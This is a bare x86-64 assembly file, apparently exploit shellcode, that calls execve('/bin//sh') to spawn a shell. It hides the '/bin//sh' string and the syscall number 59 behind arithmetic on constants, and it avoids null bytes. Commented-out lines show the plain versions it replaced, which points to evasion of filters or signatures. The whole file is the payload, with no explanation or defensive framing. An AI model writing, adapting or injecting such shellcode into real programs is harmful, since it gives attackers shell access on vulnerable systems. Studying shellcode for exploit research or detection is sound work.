global _start
section .text
_start:
  mov rsi, 0x41414141
  sub rsi, 0x41414141
	;xor rsi,rsi
	push rsi

  push rcx
  push rbx
  ;mov rax, 0x68732f2fafaaa370

  ;sub rax, 0x41414141

  mov rcx, 0xffffffffffffffff
  mov rbx, 0x978cd0d091969dd0
  sub rcx, rbx
  
	mov rdi,rcx

  pop rcx
  pop rbx

  mov rax, rdi
	push rax ; rdi

  mov rcx, rsp
	push rcx


  pop rcx
  mov rdi, rcx
	;pop rdi

  mov rbx, 0xff
  sub rbx, 0xc4

  push rbx

	pop rax
	cdq
	syscall
